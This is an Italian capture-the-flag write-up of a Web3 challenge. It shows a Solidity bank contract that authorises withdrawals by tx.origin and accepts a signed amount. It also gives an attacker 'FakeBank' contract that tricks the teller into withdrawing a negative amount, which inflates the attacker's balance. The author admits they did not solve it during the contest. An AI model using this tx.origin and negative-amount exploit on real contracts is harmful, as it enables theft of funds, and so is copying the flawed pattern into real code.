# Soluzione
## Considerazioni
A mani basse la challenge più divertente che io abbia mai *provato* a fare in gara.

![Absolute cinema](https://media1.tenor.com/m/9gyW2QldGvkAAAAC/me-atrapaste-es-cine.gif)

(Non l'ho risolta ma è stato divertente ngl, a differenza di web)


## Idea
Al link [`https://epic-web3-donations.challs.olicyber.it/bank.sol`](https://epic-web3-donations.challs.olicyber.it/bank.sol) è possibile ottenere lo smart contract utilizzato dalla challenge.
```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract TxOriginBank {
    address public teller;
    mapping(address => int256) public balances;

    constructor() {
        teller = tx.origin;
    }

    function withdraw(address addr, int256 amount) public {
        require(tx.origin == teller, "Not a teller");
        balances[addr] -= amount;
        require(balances[addr] >= 0, "Insufficient balance");
    }

    function getBalance(address addr) public view returns (int256) {
        return balances[addr];
    }
}
```

Se si ha confidenza con Solidity (o con ChatGPT almeno), è possibile notare che la funzione withdraw controlla che:

1. Il parametro `amount` è un intero **con segno** a 256 bit
2. Per chiamare la funzione bisogna essere colui che ha richiesto la transazione per costruire il contratto (aka owner).
3. Il bilancio di un account può essere aumentato chiamando questa funzione grazie al punto **1**.
4. L'ultimo check è inutile.
5. I bilanci partono da **0**.

Fatte queste osservazioni è possibile exploitare questo smart-contract deployando un nostro smart contract che fa da "interfaccia" per le richieste allo smart-contract vulnerabile.

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract TxOriginBank {
    address public teller;
    mapping(address => int256) public balances;

    constructor() {
        teller = tx.origin;
    }

    function withdraw(address addr, int256 amount) public {
        require(tx.origin == teller, "Not a teller");
        balances[addr] -= amount;
        require(balances[addr] >= 0, "Insufficient balance");
    }

    function getBalance(address addr) public view returns (int256) {
        return balances[addr];
    }
}

contract FakeBank {
    TxOriginBank public bank;

    // the address provided by the challenge
    // the one in the input box with Bank Address above
    constructor(address _bank) {
        bank = TxOriginBank(_bank);
    }

    function withdraw(address addr, int256) public { // ignored amount lol
        bank.withdraw(addr, -1000000000);
    }

    function getBalance(address) public pure returns (int256) {
        return 1;
    }
}
```

Per solvarla consiglio comunque di usare un wallet come `MetaMask`, in questo caso mi è sembrato molto più comodo delle altre poche alternative che conosco.

Una volta fatto ciò possiamo far chiamare dalla challenge la `withdraw` sulla nostra `FakeBank` per poi chiamare il `getBalance` sulla banca originale.

In questo modo la transazione di `withdraw` avrà come origine il teller (aka wallet del bot di gara) e come amount `-1000000000`, aumentando il nostro balance.


*P.S.*: La challenge era poco chiara in gara, lo è ancora adesso post solve lol.